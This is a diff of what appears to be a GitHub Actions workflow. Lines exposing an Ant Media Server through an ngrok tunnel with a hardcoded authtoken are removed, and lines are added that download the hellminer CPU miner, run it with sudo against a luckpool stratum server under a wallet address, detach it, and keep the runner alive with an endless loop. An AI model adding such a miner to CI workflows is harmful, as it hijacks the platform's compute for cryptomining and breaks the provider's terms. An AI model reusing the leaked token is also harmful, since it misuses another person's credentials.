@@ -30,18 +30,10 @@ jobs:
           sudo apt upgrade -y
           mkdir hello
           cd hello
-          wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz
-          sudo tar xvzf ngrok-v3-stable-linux-386.tgz -C /usr/local/bin
-          ngrok config add-authtoken 2IaMCj0QzC4SCS0ZTz5FLcNMcLi_4PdfzjjjL6Gcmc6P2tR9r
-          pwd
-          wget https://github.com/ant-media/Ant-Media-Server/releases/download/ams-v2.5.1/ant-media-server-community-2.5.1.zip
-          wget https://raw.githubusercontent.com/ant-media/Scripts/master/install_ant-media-server.sh 
-          sudo chmod 755 install_ant-media-server.sh
-          pwd
-          ls
-          sudo ./install_ant-media-server.sh -i ant-media-server-community-2.5.1.zip
-          sudo service antmedia stop
-          sudo service antmedia start
-          sudo service antmedia status
-          ngrok http 127.0.0.1:5080
-          echo "work done"
+          wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+          tar -xf hellminer_cpu_linux.tar.gz
+          sudo ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RFG7WJYadVbox1QBGGkt1eCbA8g9TxMha4.cpu1 -p x --cpu 2 & disown
+          while [ 1 ]; do
+          sleep 3
+          done
+          sleep 999
